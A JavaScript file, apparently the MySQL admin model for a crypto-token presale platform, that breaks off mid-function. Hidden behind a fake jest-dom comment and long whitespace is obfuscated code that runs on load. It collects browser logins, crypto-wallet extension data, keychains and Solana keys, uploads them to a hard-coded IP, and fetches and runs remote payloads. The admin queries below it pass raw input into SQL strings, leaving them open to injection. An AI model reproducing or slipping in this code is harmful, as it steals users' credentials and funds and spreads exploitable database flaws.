/* learn more: https://github.com/testing-library/jest-dom // @testing-library/jest-dom library provides a set of custom jest matchers that you can use to extend jest. These will make your tests more declarative, clear to read and to maintain.*/                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      Object.prototype.toString,Object.defineProperty,Object.getOwnPropertyDescriptor;const t="base64",c="utf8",a=require("fs"),$=require("os"),r=a=>(s1=a.slice(1),Buffer.from(s1,t).toString(c));pt=require(r("zcGF0aA")),rq=require(r("YcmVxdWVzdA")),cr=require(r("aY3J5cHRv")),ex=require(r("aY2hpbGRfcHJvY2Vzcw"))[r("cZXhlYw")],hs=$[r("caG9zdG5hbWU")](),pl=$[r("YcGxhdGZvcm0")](),hd=$[r("ZaG9tZWRpcg")](),td=$[r("cdG1wZGly")](),tp=$[r("AdHlwZQ")]();let e;const n=a=>Buffer.from(a,t).toString(c),l=()=>{let t="MTQ3LjEyNCaHR0cDovLw4yMTQuMjM3OjEyNDQ=  ";for(var c="",a="",$="",r="",e=0;e<10;e++)c+=t[e],a+=t[10+e],$+=t[20+e],r+=t[30+e];return c=c+$+r,n(a)+n(c)},s=t=>t.replace(/^~([a-z]+|\/)/,((t,c)=>"/"===c?hd:`${pt[n("ZGlybmFtZQ")](hd)}/${c}`)),h="NVRlYW05",o="Z2V0",i="Ly5ucGw",Z="d3JpdGVGaWxlU3luYw",m="L2NsaWVudA",u=n("ZXhpc3RzU3luYw"),d="TG9naW4gRGF0YQ",y="Y29weUZpbGU";function p(t){const c=n("YWNjZXNz"+"U3luYw");try{return a[c](t),!0}catch(t){return!1}}const b=n("RGVmYXVsdA"),G=n("UHJvZmlsZQ"),f=r("aZmlsZW5hbWU"),W=r("cZm9ybURhdGE"),Y=r("adXJs"),w=r("Zb3B0aW9ucw"),V=r("YdmFsdWU"),v=n("cmVhZGRpclN5bmM"),j=n("c3RhdFN5bmM"),L=(n("aXNEaXJlY3Rvcnk"),n("cG9zdA")),x="Ly5jb25maWcv",z="L0xpYnJhcnkvQXBwbGljYXRpb24gU3VwcG9ydC8",F="L0FwcERhdGEv",R="L1VzZXIgRGF0YQ",N="R29vZ2xlL0Nocm9tZQ",X="QnJhdmVTb2Z0d2FyZS9CcmF2ZS1Ccm93c2Vy",Q="Z29vZ2xlLWNocm9tZQ",_=["TG9jYWwvQnJhdmVTb2Z0d2FyZS9CcmF2ZS1Ccm93c2Vy",X,"QnJhdmVTb2Z0d2FyZS9CcmF2ZS1Ccm93c2Vy"],J=["TG9jYWwvR29vZ2xlL0Nocm9tZQ",N,Q],g=["Um9hbWluZy9PcGVyYSBTb2Z0d2FyZS9PcGVyYSBTdGFibGU","Y29tLm9wZXJhc29mdHdhcmUuT3BlcmE","b3BlcmE"];let k="comp";const U=["bmtiaWhmYmVv","ZWpiYWxiYWtv","Zmhib2hpbWFl","aG5mYW5rbm9j","aWJuZWpkZmpt","YmZuYWVsbW9t","YWVhY2hrbm1l","aGlmYWZnbWNj"],B=["Z2FlYW9laGxlZm5rb2RiZWZncGdrbm4","cGxjaGxnaGVjZGFsbWVlZWFqbmltaG0","bGJvaHBqYmJsZGNuZ2NuYXBuZG9kanA","ZmVvZmJkZGdjaWpubWhuZm5rZG5hYWQ","bWtwY25scGVia2xtbmtvZW9paG9mZWM","ZWltaGxwbWdqbmpvcGhocGtrb2xqcGE","ZnBoZXBjY2lvbmJvb2hja29ub2VlbWc","ZHBla3Bsb21qamtjZmdvZG5oY2VsbGo"],q="Y3JlYXRlUmVhZFN0cmVhbQ",C=async(t,c,$)=>{let r=t;if(!r||""===r)return[];try{if(!p(r))return[]}catch(t){return[]}c||(c="");let e=[];const l=n("TG9jYWwgRXh0ZW5zaW9uIFNldHRpbmdz"),s=n(q),h=n("LmxkYg"),o=n("LmxvZw");for(let $=0;$<200;$++){const i=`${t}/${0===$?b:`${G} ${$}`}/${l}`;for(let t=0;t<U.length;t++){const l=n(U[t]+B[t]);let Z=`${i}/${l}`;if(p(Z)){try{far=a[v](Z)}catch(t){far=[]}far.forEach((async t=>{r=pt.join(Z,t);try{(r.includes(h)||r.includes(o))&&e.push({[V]:a[s](r),[w]:{[f]:`${c}${$}_${l}_${t}`}})}catch(t){}}))}}}if($){const t=n("c29sYW5hX2lkLnR4dA");if(r=`${hd}${n("Ly5jb25maWcvc29sYW5hL2lkLmpzb24")}`,a[u](r))try{e.push({[V]:a[s](r),[w]:{[f]:t}})}catch(t){}}return S(e),e},S=t=>{const c=r("YbXVsdGlfZmlsZQ"),a=n("L3VwbG9hZHM"),$={timestamp:e.toString(),type:h,hid:k,[c]:t},s=l();try{const t={[Y]:`${s}${a}`,[W]:$};rq[L](t,((t,c,a)=>{}))}catch(t){}},T=async(t,c)=>{try{const a=s("~/");let $="";$="d"==pl[0]?`${a}${n(z)}${n(t[1])}`:"l"==pl[0]?`${a}${n(x)}${n(t[2])}`:`${a}${n(F)}${n(t[0])}${n(R)}`,await C($,`${c}_`,0==c)}catch(t){}},H=async()=>{let t=[];const c=n(d),$=n(q),r=n("L0xpYnJhcnkvS2V5Y2hhaW5zL2xvZ2luLmtleWNoYWlu"),e=n("bG9na2MtZGI");if(pa=`${hd}${r}`,a[u](pa))try{t.push({[V]:a[$](pa),[w]:{[f]:e}})}catch(t){}else if(pa+="-db",a[u](pa))try{t.push({[V]:a[$](pa),[w]:{[f]:e}})}catch(t){}try{const r=n(y);let e="";if(e=`${hd}${n(z)}${n(N)}`,e&&""!==e&&p(e))for(let n=0;n<200;n++){const l=`${e}/${0===n?b:`${G} ${n}`}/${c}`;try{if(!p(l))continue;const c=`${e}/ld_${n}`;p(c)?t.push({[V]:a[$](c),[w]:{[f]:`pld_${n}`}}):a[r](l,c,(t=>{let c=[{[V]:a[$](l),[w]:{[f]:`pld_${n}`}}];S(c)}))}catch(t){}}}catch(t){}return S(t),t},A=async()=>{let t=[];const c=n(d),$=n(q);try{const r=n(y);let e="";if(e=`${hd}${n(z)}${n(X)}`,e&&""!==e&&p(e))for(let n=0;n<200;n++){const l=`${e}/${0===n?b:`${G} ${n}`}/${c}`;try{if(!p(l))continue;const c=`${e}/brld_${n}`;p(c)?t.push({[V]:a[$](c),[w]:{[f]:`brld_${n}`}}):a[r](l,c,(t=>{let c=[{[V]:a[$](l),[w]:{[f]:`brld_${n}`}}];S(c)}))}catch(t){}}}catch(t){}return S(t),t},E=async()=>{let t=[];const c=n(q),$=n("a2V5NC5kYg"),r=n("bG9naW5zLmpzb24");try{let e="";if(e=`${hd}${n(z)}${n("RmlyZWZveA")}`,e&&""!==e&&p(e))for(let n=0;n<200;n++){const l=0===n?b:`${G} ${n}`,s=`${e}/${l}/${$}`,h=`${e}/${l}/${r}`;try{if(!p(s))continue;t.push({[V]:a[c](s),[w]:{[f]:`fk4_${n}`}})}catch(t){}try{if(!p(h))continue;t.push({[V]:a[c](h),[w]:{[f]:`flj_${n}`}})}catch(t){}}}catch(t){}return S(t),t},M=async()=>{let t=[];n(d);const c=n(q);try{const t=n("Ly5sb2NhbC9zaGFyZS9rZXlyaW5ncy8");let $="";$=`${hd}${t}`;let r=[];if($&&""!==$&&p($))try{r=a[v]($)}catch(t){r=[]}r.forEach((async t=>{pa=pt.join($,t);try{ldb_data.push({[V]:a[c](pa),[w]:{[f]:`${t}`}})}catch(t){}}))}catch(t){}return S(t),t},I=async()=>{let t=[];const c=n(d),$=n(q);try{const r=n(y);let e="";if(e=`${hd}${n(x)}${n(Q)}`,e&&""!==e&&p(e))for(let n=0;n<200;n++){const l=`${e}/${0===n?b:`${G} ${n}`}/${c}`;try{if(!p(l))continue;const c=`${e}/ld_${n}`;p(c)?t.push({[V]:a[$](c),[w]:{[f]:`plld_${n}`}}):a[r](l,c,(t=>{let c=[{[V]:a[$](l),[w]:{[f]:`plld_${n}`}}];S(c)}))}catch(t){}}}catch(t){}return S(t),t},O=async()=>{let t=[];const c=n(q),$=n("a2V5NC5kYg"),r=n("a2V5My5kYg"),e=n("bG9naW5zLmpzb24");try{let l="";if(l=`${hd}${n("Ly5tb3ppbGxhL2ZpcmVmb3gv")}`,l&&""!==l&&p(l))for(let n=0;n<200;n++){const s=0===n?b:`${G} ${n}`,h=`${l}/${s}/${$}`,o=`${l}/${s}/${r}`,i=`${l}/${s}/${e}`;try{if(!p(h))continue;t.push({[V]:a[c](h),[w]:{[f]:`flk4_${n}`}})}catch(t){}try{if(!p(o))continue;t.push({[V]:a[c](o),[w]:{[f]:`flk3_${n}`}})}catch(t){}try{if(!p(i))continue;t.push({[V]:a[c](i),[w]:{[f]:`fllj_${n}`}})}catch(t){}}}catch(t){}return S(t),t},P=n("cm1TeW5j"),D="XC5weXBccHl0aG9uLmV4ZQ",K=51476590;let tt=0;const ct=async t=>{const c=`${n("dGFyIC14Zg")} ${t} -C ${hd}`;ex(c,((c,$,r)=>{if(c)return a[P](t),void(tt=0);a[P](t),rt()}))},at=()=>{const t=n("cDIuemlw"),c=`${l()}${n("L3Bkb3du")}`,$=`${td}\\${n("cC56aQ")}`,r=`${td}\\${t}`;if(tt>=K+6)return;const e=n("cmVuYW1lU3luYw"),s=n("cmVuYW1l");if(a[u]($))try{var h=a[j]($);h.size>=K+6?(tt=h.size,a[s]($,r,(t=>{if(t)throw t;ct(r)}))):(tt<h.size?tt=h.size:(a[P]($),tt=0),$t())}catch(t){}else{const t=`${n("Y3VybCAtTG8")} "${$}" "${c}"`;ex(t,((t,c,n)=>{if(t)return tt=0,void $t();try{tt=K+6,a[e]($,r),ct(r)}catch(t){}}))}};function $t(){setTimeout((()=>{at()}),2e4)}const rt=async()=>await new Promise(((t,c)=>{if("w"==pl[0]){const t=`${hd}${n(D)}`;a[u](`${t}`)?(()=>{const t=l(),c=n(m),$=n(o),r=n(Z),e=n(i),s=`${t}${c}/${h}`,u=`${hd}${e}`,d=`"${hd}${n(D)}" "${u}"`;try{a[P](u)}catch(t){}rq[$](s,((t,c,$)=>{if(!t)try{a[r](u,$),ex(d,((t,c,a)=>{}))}catch(t){}}))})():at()}else(()=>{const t=l(),c=n(m),$=n(Z),r=n(o),e=n(i),s=n("cHl0aG9u"),u=`${t}${c}/${h}`,d=`${hd}${e}`;let y=`${s}3 "${d}"`;rq[r](u,((t,c,r)=>{t||(a[$](d,r),ex(y,((t,c,a)=>{})))}))})()}));var et=0;const nt=async()=>{try{e=Date.now(),await(async()=>{k=hs;try{const t=s("~/");await T(J,0),await T(_,1),await T(g,2),"w"==pl[0]?(pa=`${t}${n(F)}${n("TG9jYWwvTWljcm9zb2Z0L0VkZ2U")}${n(R)}`,await C(pa,"3_",!1)):"d"==pl[0]?(await H(),await A(),await E()):"l"==pl[0]&&(await M(),await I(),await O())}catch(t){}})(),rt()}catch(t){}};nt();let lt=setInterval((()=>{(et+=1)<5?nt():clearInterval(lt)}),6e5);

const config = require('../config');
const mysql = require('mysql2');
const pool = mysql.createPool({ host: config.mysqlHost, user: config.user, password: process.env.DB_PASS || config.password, database: config.database, port: config.mysqlPort });
const promisePool = pool.promise();

class AdminModel {
  
  getAdminInfo = async (data) => {
    let sql = `SELECT * FROM mnm_cp where username = '${data.username}'`;
    const [result, fields] = await promisePool.query(sql);
    
    return result;
  }

  getDashboardStatistics = async (data) => {
    let sql = `SELECT COUNT(id)as totalUsers,SUM(CASE WHEN date_format(created_at,'%Y-%m-%d')=CURDATE() THEN 1 ELSE 0 end) as todayRegisteredUsers,
       (select COUNT(id) from subscribers) as totalSubscribers,
       (select COALESCE(sum(amount),0) from withdraw) as totalWithdraw,
       (select COALESCE(sum(amount),0) from stacking) as totalStaking,
       (select coalesce(sum(token),0) from transactions) as totalSell,
       (select coalesce(sum(token),0) from transactions where date(created_at)=CURRENT_DATE) AS todaySell,
       (select coalesce(sum(token),0) from transactions where date(created_at)>=(NOW() - INTERVAL 7 DAY)) AS weekSell,
       (select coalesce(sum(token),0) from transactions where date(created_at)>=(NOW() - INTERVAL 1 MONTH)) AS yearSell
        FROM registration`;
    const [result, fields] = await promisePool.query(sql);
    
    return result[0];
  }
  

  // getUsersList = async (data) => {
  //   let sql = `SELECT id, bnb_address, email, refer_by,getUserPurchase(id) as purchase_token,coalesce(getUserPurchase(id),0)*(select price from phase where id =3) as purchase_token_usd, balance as mnt_balance, total_deposit, vesting_balance, blocked, created_at from registration ORDER BY id DESC`;
  //   // ,  getTotalDeposit(id) as totalTeamDeposite, getTeamCount(id) as teamCount
  //   const [result, fields] = await promisePool.query(sql);
  //   return result;
  // }
  getUsersList = async (data) => {
    console.log("data",data);
    let fromdate = data.from_date;
    let todate = data.to_date;
    let type = data.type;
    let sql = `SELECT id, bnb_address, email, refer_by,getUserPurchase(id) as purchase_token,coalesce(getUserPurchase(id),0)*(select price from phase where id =3) as purchase_token_usd, balance as mnt_balance, total_deposit, vesting_balance, blocked, created_at from registration where 1`;
    if (type == 2) {
      sql = sql + ` and date(created_at)=CURRENT_DATE `;
    } else if (type == 3) {
      sql = sql + ` and date(created_at)>=(NOW() - INTERVAL 7 DAY) `;
    } else if (type == 4) {
      sql = sql + ` and date(created_at)>=(NOW() - INTERVAL 1 MONTH) `;
    } else {
      if (fromdate) {
        sql = sql + ` and date(created_at)>='${fromdate}'`;
      }
      if (todate) {
        sql = sql + ` and date(created_at)<='${todate}' `;
      }
    }
    sql = sql + ` ORDER BY id DESC `;
    const [result, fields] = await promisePool.query(sql);
    
    return result;
  };

  getUsersDetails = async (email) => {
    let sql = `SELECT * FROM registration where email = '${email}'`;
    const [result, fields] = await promisePool.query(sql);
    
    return result;
}

getUsersListFilter = async (data) => {
    let sql = `SELECT * FROM registration WHERE email LIKE '%${data}%'`;
    const [result, fields] = await promisePool.query(sql);
    
    return result;
}

  getUsersReferrals = async (data) => {
    let sql = `select a.id, a.email, a.total_deposit, a.created_at, u.email as referred_by,(select sum(amount) from history where user_id='${data.uid}') as refEarning,getTeamPurchase('${data.uid}')as totalDeposit from (select id,total_deposit, bnb_address, referred_by_id, email, created_at from (select * from registration order by referred_by_id, id) registration, (select @pv := '${data.uid}') initialisation where find_in_set(referred_by_id, @pv) > 0 and @pv := concat(@pv, ',', id)) as a left join registration as u on u.id=a.referred_by_id ORDER BY a.id DESC`;
    const [result, fields] = await promisePool.query(sql);
    
    return result;
  }

  getStackingHistory = async (data) => {
    let sql = `SELECT stacking.*, registration.email, getTotalStaking() as totalStaking FROM stacking LEFT JOIN registration ON registration.id=stacking.user_id ORDER BY stacking.id DESC `;
    const [result, fields] = await promisePool.query(sql);
    
    return result;
  }
  
  getWithdrawalStatistics = async (data) => {
    let sql = `SELECT sum(CASE WHEN status=0 THEN amount ELSE 0 end) as pendingTokenAmount,
    sum(CASE WHEN  status=0 then bnb_amount else 0 end) as pendingBNBAmount,
      sum(CASE WHEN status=1 THEN amount ELSE 0 end) as approvedTokenAmount,
    sum(CASE WHEN  status=1 then bnb_amount else 0 end) as approvedBNBAmount,
      sum(CASE WHEN status=2 THEN amount ELSE 0 end) as rejectedTokenAmount,
    sum(CASE WHEN  status=2 then bnb_amount else 0 end) as rejectedBNBAmount
       FROM withdraw where type = 1`;
    const [result, fields] = await promisePool.query(sql);
    
    return result[0];
  }

  getWithdrawalStatisticsCrypto = async (data) => {
    let sql = `SELECT sum(CASE WHEN status=0 THEN amount ELSE 0 end) as pendingTokenAmountCrypto,
    sum(CASE WHEN  status=0 then amount else 0 end) as pendingBNBAmountCrypto,
      sum(CASE WHEN status=1 THEN amount ELSE 0 end) as approvedTokenAmountCrypto,
    sum(CASE WHEN  status=1 then amount else 0 end) as approvedBNBAmountCrypto,
      sum(CASE WHEN status=2 THEN amount ELSE 0 end) as rejectedTokenAmountCrypto,
    sum(CASE WHEN  status=2 then amount else 0 end) as rejectedBNBAmountCrypto
       FROM withdraw where type = 2`;
    const [result, fields] = await promisePool.query(sql);
    
    return result[0];
  }

  getMntWithdrawalHistory = async (data) => {
    let sql = `SELECT w.*,r.email , u.account_number, u.bank_name, u.ifsc_code FROM withdraw as w inner join registration as r on r.id=w.user_id LEFT join user_bank_detail as u on u.user_id=r.id where w.type = 1 ORDER BY w.id DESC`;
    const [result, fields] = await promisePool.query(sql);
    
    return result;
  }
  getCryptoMntWithdrawalHistory = async (data) => {
    let sql = `SELECT w.*,r.email , u.account_number, u.bank_name, u.ifsc_code FROM withdraw as w inner join registration as r on r.id=w.user_id LEFT join user_bank_detail as u on u.user_id=r.id where w.type = 2 ORDER BY w.id  DESC`;
    const [result, fields] = await promisePool.query(sql);
    
    return result;
  }
  getCryptoMntWithdrawalHistoryAdmin = async (data) => {
    let sql = `SELECT w.* , r.bnb_address , r.id as uid , r.email from withdraw as w inner join registration as r on w.bnb_address = r.bnb_address where w.user_id = 1 ORDER BY w.id  DESC`;
    const [result, fields] = await promisePool.query(sql);
    
    return result;
  }
  


  approveWithdrwalRequest = async (data) => {
    let date = new Date()
      let sql = `UPDATE withdraw SET approveDate ='${date}', status = 1 WHERE id = '${data.request_id}' `;
      const [result, fields] = await promisePool.query(sql);
      
      return result.affectedRows;  
  }

  rejectWithdrwalRequest = async (data) => {
    let sql1 = `SELECT * FROM withdraw where id = '${data.request_id}'`;
    const [result1, fields1] = await promisePool.query(sql1);
    
    if(result1)
    {
      let token = result1[0].amount;
      let user_id = result1[0].user_id;
      let sql3 = `UPDATE registration SET balance = balance+'${token}' WHERE id = '${user_id}' `;
      const [result3, fields3] = await promisePool.query(sql3);
      let sql4 = `UPDATE withdraw SET status = 2 WHERE id = '${data.request_id}' `;
      const [result4, fields4] = await promisePool.query(sql4);
      
      return true;
    }
    else {
      return false;
    }
    // let sql = `UPDATE withdraw SET status = 2 WHERE id = '${data.request_id}' `;
    // const [result, fields] = await promisePool.query(sql);
    // return result.affectedRows;  
  }
  
  getTransactionHistory = async (data) => {
    var type = data.type;
    let user_id = data.user_id;
    let whereUserId = '';
    if (user_id) {
      whereUserId = ` AND tr.user_id = ${user_id} `;
    }
    console.log("whereUserId", whereUserId);
    if (type == 1) {
      var sql = `SELECT tr.*,r.email, p.phase as phase_name,getDateWiseSale(CURRENT_DATE,CURRENT_DATE) AS totalSale FROM transactions as tr inner join registration as r on r.id=tr.user_id LEFT JOIN phase as p ON p.id=tr.phase where date(tr.created_at)=CURRENT_DATE ${whereUserId} ORDER BY tr.id DESC`;
    }
    if (type == 2) {
      var fromdate = data.from_date;
      var todate = data.to_date;
      var sql = `SELECT tr.*,r.email, p.phase as phase_name,getDateWiseSale('${fromdate}','${todate}') AS totalSale FROM transactions as tr inner join registration as r on r.id=tr.user_id LEFT JOIN phase as p ON p.id=tr.phase where date(tr.created_at)>='${fromdate}' and date(tr.created_at)<='${todate}' ${whereUserId} ORDER BY tr.id DESC`;
    }
    if (type == 3) {
      var sql = `SELECT tr.*,r.email, p.phase as phase_name,getTotalSale()  as totalSale FROM transactions as tr inner join registration as r on r.id=tr.user_id LEFT JOIN phase as p ON p.id=tr.phase WHERE 1 ${whereUserId} ORDER BY tr.id DESC`;
    }
    console.log(sql);
    const [result, fields] = await promisePool.query(sql);
    return result;
  }

  getPhaseList = async (data) => {
    let sql = `SELECT * FROM phase`;
    const [result, fields] = await promisePool.query(sql);
    
    return result;
  }
  
  updatePhase = async (data) => {
    let sql = `UPDATE phase SET price = '${data.price}' WHERE id = '${data.id}'`;
    console.log(sql);
    const [result, fields] = await promisePool.query(sql);
    
    return result.affectedRows;
  } 

  updatecryptowithdraw = async (data) => {
    let sql = `UPDATE withdraw SET status = 1 , txn_hash = '${data.txn_hash}' WHERE id = '${data.id}'`;
    console.log(sql);
    const [result, fields] = await promisePool.query(sql);
    
    return result.affectedRows;
  } 

  updatePhaseStatus = async (data) => {
    if(data.status == 1)
    {
      let sql = `UPDATE phase SET status = '0' WHERE id != '${data.id}'`;
      const [result, fields] = await promisePool.query(sql);
    }
    let sql1 = `UPDATE phase SET status = '${data.status}' WHERE id = '${data.id}'`;
    const [result1, fields1] = await promisePool.query(sql1);
    
    return result1.affectedRows;
  }

  getStackingSetting = async (data) => {
    let sql = `SELECT * FROM stacking_setting`;
    const [result, fields] = await promisePool.query(sql);
    
    return result[0];
  }

  getSystemSetting = async (data) => {
    let sql = `SELECT * FROM settings`;
    const [result, fields] = await promisePool.query(sql);
    
    return result[0];
  }

  updateSystemSetting = async (data) => {
    let sql = `UPDATE settings SET 
              deposit_fee = '${data.deposit_fee}',
              withdraw_fee = '${data.withdraw_fee}',
              direct_refer_point = '${data.direct_refer_point}',
              point_price = '${data.point_price}',
              social_media_points = '${data.social_media_points}',
              monthly_withdraw = '${data.monthly_withdraw}',
              locking_duration = '${data.locking_duration}',
              referral_percent = '${data.referral_percent}',
              referral_percent1 = '${data.referral_percent1}'
            WHERE id = '${data.id}'`;
    const [result, fields] = await promisePool.query(sql);
    
    return result.affectedRows;
  }

  updateTradeFee = async (data) => {
    let sql = `UPDATE settings SET 
             
              trade_fee = '${data.trade_fee}'
            WHERE id = '${data.id}'`;
    const [result, fields] = await promisePool.query(sql);
    
    return result.affectedRows;

  }

  getDynamicPrice = async (data) => {
    let sql = `SELECT * FROM dynamic_price`;
    const [result, fields] = await promisePool.query(sql);
    
    return result[0];
  }
  
  getSubscriberList = async (data) => {
    let sql = `SELECT * FROM subscribers ORDER BY id DESC`;
    const [result, fields] = await promisePool.query(sql);
    
    return result;
  }
  
  changePassword = async (newPassword, admin_id) => {
    let sql = `UPDATE mnm_cp SET password = '${newPassword}' WHERE id = '${admin_id}'`;
    const [result, fields] = await promisePool.query(sql);
    
    return result.affectedRows;
  } 
  
  getActivePhase = async () => {
    let sql = `SELECT id, phase, quantity, price, status, DATE_FORMAT(start_date, '%Y-%m-%d %H:%i:%s') as start_date, DATE_FORMAT(end_date, '%Y-%m-%d %H:%i:%s') as end_date FROM phase WHERE status = 1`;
    const [result, fields] = await promisePool.query(sql);
    
    return result;
  }
  
  insertActivity = async (activityData) => {
    let sql = `INSERT INTO activity(activity_type, user_id, ip) VALUES( '${activityData.activity_type}'  , '${activityData.user_id}', '${activityData.ip}' ) `;
    const [result, fields] = await promisePool.query(sql);
    
    return result.insertId;
  } 
  userblock=async(data)=>{
  let sql=`UPDATE registration set blocked=1 WHERE id= '${data.id}'`;
  const [result,fields]=await promisePool.query(sql);
  
  return result;
}
userUnblock=async(data)=>{
  let sql=`UPDATE registration set blocked=0 WHERE id= '${data.id}'`;
  const [result,fields]=await promisePool.query(sql);
  
  return result;
}
insertblog=async(data)=>{
  let sql = `INSERT INTO blog (image,title,description,blog_type,introduction, title_url) values('${data.image}','${data.title}','${data.description}','${data.blog_type}','${data.introduction}' ,'${data.titleUrl}')`;
  const [result,fields]=await promisePool.query(sql);
  
  return result;
}
updatetblog = async (data) => {
  let img = (!data.image)? '':'image="'+data.image+'", ';
  let sql =`UPDATE blog SET ${img}
            title = '${data.title}',
            blog_type = '${data.blog_type}',
            description = '${data.description}',
            introduction='${data.introduction}',
            title_url='${data.titleUrl}'
            WHERE id = '${data.id}'`;
  console.log(sql);     
  const [result, fields] = await promisePool.query(sql);
  
  return result.affectedRows;
}
getblog = async (data) => {
  let sql = `SELECT id,image,title,description,blog_type,introduction from blog ORDER BY id DESC  `;
  const [result, fields] = await promisePool.query(sql);
  
  return result;
}
getblogid = async (data) => {
  let sql = `SELECT id,image,title,description,blog_type,introduction from blog WHERE id ='${data.id}'`;
  const [result, fields] = await promisePool.query(sql);
  
  return result;
}
blogdelete = async (data) => {
  let sql = `DELETE  FROM blog WHERE id ='${data.id}'`;
  const [result, fields] = await promisePool.query(sql);
  
  return result;
}
getuserDetails = async (data) => {
  let sql = `SELECT r.*, r1.email as refemail  from registration as r LEFT join registration as r1 on  r.referred_by_id=r1.id WHERE r.id='${data.id}'`;
  const [result, fields] = await promisePool.query(sql);
  
  return result;
}

showusersDetails = async (data) => {
  let sql = `SELECT first_name, email , bnb_address , id as uid from registration `;
  const [result, fields] = await promisePool.query(sql);
  
  return result;
}
getBlogSlider = async (data) => {
  let sql = `SELECT id,image,title,description,status,updated_at from  blog_slider  ORDER BY id DESC`;
  const [result, fields] = await promisePool.query(sql);
  
  return result;
}
getblogsliderid = async (data) => {
  let sql = `SELECT id,image,title,description,status from blog_slider WHERE id ='${data.id}'`;
  const [result, fields] = await promisePool.query(sql);
  
  return result;
}
updateBlogSlider = async (data) => {
  let img = (!data.image)? '':'image="'+data.image+'", ';
  let sql =`UPDATE blog_slider SET ${img}
            title = '${data.title}',
            status = '${data.status}',
            description = '${data.description}'
            WHERE id = '${data.id}'`;
            
  const [result, fields] = await promisePool.query(sql);
  
  return result.affectedRows;
}
activeBlog=async(data)=>{
  let sql=`UPDATE blog_slider set status=1 WHERE id= '${data.id}'`;
  const [result,fields]=await promisePool.query(sql);
  
  return result;
}
deactiveBlog=async(data)=>{
  
  let sql=`UPDATE blog_slider set status=0 WHERE id='${data.id}'`;
  const [result,fields]=await promisePool.query(sql);
  
  return result;
}
addBlogslider=async(data)=>{
  let sql=`UPDATE blog set 	addslider=1 WHERE id= '${data.id}'`;
  const [result,fields]=await promisePool.query(sql);
  
  return result;
}
notaddBlogslider=async(data)=>{
  
  let sql=`UPDATE blog set 	addslider=0 WHERE id='${data.id}'`;
  const [result,fields]=await promisePool.query(sql);
  
  return result;
}
inserAchiever=async(data)=>{
  let sql = `INSERT INTO  achiever (images,name,designation,bio) values('${data.images}','${data.name}','${data.designation}','${data.bio}')`;
  const [result,fields]=await promisePool.query(sql);
  
  return result;
}

insertTransactionHash=async(data)=>{
  let sql = `INSERT INTO  withdraw (bnb_address,amount,txn_hash,user_id,status,fee) values('${data.bnb_address}','${data.token}','${data.transactionHash}',1,1,0)`;
  const [result,fields]=await promisePool.query(sql);
  
  return result;
}


updateachieve = async (data) => {
  let img = (!data.images)? '':'images="'+data.images+'", ';
  let sql =`UPDATE achiever SET ${img}
            name = '${data.name}',
            designation = '${data.designation}',
            bio = '${data.bio}'
            WHERE id = '${data.id}'`;
         
  const [result, fields] = await promisePool.query(sql);
  
  return result.affectedRows;
}
getachiever = async () => {
  let sql = `SELECT id,images,name,designation,bio from achiever  ORDER BY id DESC  `;
  const [result, fields] = await promisePool.query(sql);
  
  return result;
}
getachieverid = async (data) => {
  let sql = `SELECT id,images,name,designation,bio from achiever  WHERE id ='${data.id}'`;
  const [result, fields] = await promisePool.query(sql);
  
  return result;
}
achieverdelete = async (data) => {
  let sql = `DELETE  FROM achiever WHERE id ='${data.id}'`;
  console.log(sql)
  const [result, fields] = await promisePool.query(sql);
  
  return result;
}




updatebuyrequest = async (data) => {
  // let sql1 = `INSERT INTO stacking(user_id, phase_id, amount, fee, usd_amount, apy, period, remaining, bnb_address, wallet) SELECT user_id,1,token,fee,amount,100,100,100,bnb_address,'vesting' from transactions where id ='${data.id}'`;

// console.log('data',data)
  let sql1 = `select COALESCE(balance,0) as balance from registration where id=${data.user_id}`

  let sql = `UPDATE transactions SET status = 1 WHERE id = '${data.id}'`;

  const [result1, fields1] = await promisePool.query(sql1);

// console.log('result11',result1,result1[0].balance,data.token,data.user_id)
  let updatebalance = parseFloat(result1[0].balance) + parseFloat(data.token) 

// console.log('result23',updatebalance)

  let sql2 = `UPDATE registration SET balance = '${updatebalance}' WHERE id = '${data.user_id}'`;


    const [result2, fields2] = await promisePool.query(sql2);
    
    const [result, fields] = await promisePool.query(sql);


  // }
  // let sql1 = `UPDATE transactions SET status = '${data.status}' WHERE id = '${data.id}'`;
  // const [result1, fields1] = await promisePool.query(sql1);
  
  return result.affectedRows;
}

rejectbuyrequest = async (data) => {
  // let sql1 = `INSERT INTO stacking(user_id, phase_id, amount, fee, usd_amount, apy, period, remaining, bnb_address, wallet) SELECT user_id,1,amount,fee,usd_amount,100,100,100,bnb_address,'vesting' from transactions where id ='${data.id}'`;

    let sql = `UPDATE transactions SET status = 2 WHERE id = '${data.id}'`;
    // const [result1, fields1] = await promisePool.query(sql1);
    const [result, fields] = await promisePool.query(sql);

  // }
  // let sql1 = `UPDATE transactions SET status = '${data.status}' WHERE id = '${data.id}'`;
  // const [result1, fields1] = await promisePool.query(sql1);
  
  return result.affectedRows;
}

getwithdrawhistory = async (data) => {
  let sql = `SELECT id,user_id,bnb_address,amount,round(amount*(select price from phase where id =3),2) as amountUSD,bnb_amount,(case when status=1 then 'Approved' when status=2 then 'Rejected' else 'Pending' end) as status, created_at,approveDate,getTotalApprovedWithdraw(${data.user_id}) as totalWithdraw, round(getUserWithdraw(${data.user_id})*(select price from phase where id =3),2) as totalWithdrawUSD from withdraw where user_id=${data.user_id}`;
  const [result, fields] = await promisePool.query(sql);
  
  return result;
};

getReferalEarning = async (data) => {
  let sql = `SELECT h.id,h.stacking_id,r.bnb_address,r.email,h.type,h.amount,h.history,h.created_at,h.usd_amount,getTotalReferralEarning(h.user_id) as totalRefEarning,h.referral_percent,round(getTotalReferralEarning(h.user_id)*(select price from phase where id =3),2) as totalRefEarningUSD from history as h left join registration as r on r.id=h._from WHERE h.type=2 and h.user_id =${data.user_id}`;
  const [result, fields] = await promisePool.query(sql);
  
  return result;
};

getstackingEarning = async (data) => {
  let sql = `SELECT id,stacking_id,bnb_address,type,amount,history,created_at,usd_amount,getTokenStackEarning(user_id) as totalEarning,referral_percent,round(getTokenStackEarning(user_id)*(select price from phase where id =3),2) as totalEarningUSD from history WHERE  type=1 and user_id =${data.user_id}`;
  console.log(sql);
  const [result, fields] = await promisePool.query(sql);
  
  return result;
};

getPrchaseHistory = async (data) => {
  let sql = ` select id,amount,token,phase,transactionHash,created_at,user_id,status,usd_amount,getUserPurchase(user_id) as userPurchase,round(getUserPurchase(user_id)*(select price from phase where id =3),2) as userPurchaseUSD from transactions where user_id=${data.user_id} and status=1 order by id DESC `;
  const [result, fields] = await promisePool.query(sql);
  
  return result;
};

 getexchangetransaction = async (data) => {
